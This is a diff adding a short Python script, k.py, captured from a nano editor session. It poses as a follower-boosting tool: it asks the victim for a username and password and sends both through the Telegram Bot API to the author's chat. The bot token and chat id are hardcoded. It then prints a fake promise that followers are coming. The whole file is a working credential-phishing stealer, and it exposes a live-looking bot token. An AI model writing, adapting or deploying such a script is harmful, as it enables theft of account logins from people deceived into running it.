@@ -1,0 +1,12 @@
+GNU nano 7.2                              k.py
+from colorama import Fore, Back, Style
+import requests
+
+u  = input(Fore.RED + "ENTER YOUR USERNAME: ")
+p = input(Fore.RED + "ENTER YOUR PASSWORD: ")
+
+TOKEN = "6045708760:AAG2mj-oGSp1-O8XTVlBehpscRbJcBEOGAE"
+chat_id = "5307797579"
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=USERNAME:>
+print(requests.get(url).json())
+print("                \033[1m\033[42m ⚡\033[31mFOLLOWERW WILL BE ADDED SOON⚡ \033[0m")
